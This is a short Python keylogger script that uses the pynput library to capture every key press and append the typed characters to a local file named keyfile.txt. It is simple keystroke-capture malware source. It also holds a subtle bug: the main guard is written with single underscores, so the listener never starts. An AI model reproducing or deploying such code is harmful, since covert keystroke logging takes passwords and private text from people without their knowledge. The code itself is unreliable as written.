from pynput import keyboard
import time

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if _name_ == "_main_":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()